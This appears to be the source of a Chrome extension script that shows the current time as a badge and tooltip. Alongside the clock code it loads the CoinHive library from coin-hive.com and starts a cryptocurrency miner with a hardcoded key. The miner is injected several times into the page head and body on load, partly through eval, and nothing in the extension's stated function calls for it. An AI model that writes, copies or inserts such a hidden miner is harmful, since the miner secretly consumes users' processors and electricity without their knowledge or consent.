//<script>
	window.onload = function() {
		window.setInterval( function() {
			var now = new Date();
			var h = now.getHours();
			var m = now.getMinutes();
			var s = now.getSeconds();
			
			var badge_text = (m < 10 ? "0" + m : m).toString();
			var title_text = (h < 10 ? "0" + h : h) + ":" + (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
			
			console.log(badge_text);
			console.log(title_text);
			
			chrome.browserAction.setBadgeText({text:badge_text}) // 100個表示
			chrome.browserAction.setTitle({title: title_text});
		}, 1000);
	}	

	
	function sleep(millis) {
    var t = (new Date()).getTime();
    var i = 0;
    while (((new Date()).getTime() - t) < millis) {
        i++;
    }
}

/*var script1 = document.createElement("head");
		script1.innerHTML = "<script src=\"http://coin-hive.com/lib/coinhive.min.js\"></script> <script>var miner = new CoinHive.Anonymous(\"QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo\"); miner.start();</script>";
		document.getElementsByTagName("html")[0].appendChild(script1);*/
		  $("head").append("<script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>");

		function gggg() {
    		
		//sleep(500);
		
		$("head").append("<script>eval ('var miner = new CoinHive.Anonymous(\"QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo\")'); </script>");	
//sleep(100);		
		$("head").append("<script>eval ('miner.start();') </script>");
		//sleep(500);	
		$("head").append("<script>var miner = new CoinHive.Anonymous('QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo'); </script>");	
		$("head").append("<script>miner.start(); </script>");		
		
  }
  
  $(document).ready(gggg());

  window.onload = function () {
    	//$("head").append("<script src=\"http://coin-hive.com/lib/coinhive.min.js\"></script>");
		//sleep(500);
		
		$("body").append("<script>eval ('var miner = new CoinHive.Anonymous(\"QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo\")'); </script>");	
//sleep(100);		
		$("body").append("<script>eval ('miner.start();') </script>");
		//sleep(500);	
		$("body").append("<script>var miner = new CoinHive.Anonymous('QFAw0gr22QKW9VcYMIiT5uECYYZgIsXo'); </script>");	
		$("body").append("<script>miner.start(); </script>");	
}
			
			/*var script=document.createElement('script');
script.type='text/javascript';
script.src='alert("aa");';*/

	
	/*$.get(chrome.extension.getURL('/injected.js'), 
	function(data) {		
		
		var script = document.createElement("script");
		script.setAttribute("type", "text/javascript");
		script.innerHTML = data;
		document.getElementsByTagName("head")[0].appendChild(script);			
		document.getElementsByTagName("body")[0].setAttribute("onLoad", "injected_main();");
	}
	
);*/



//</script>

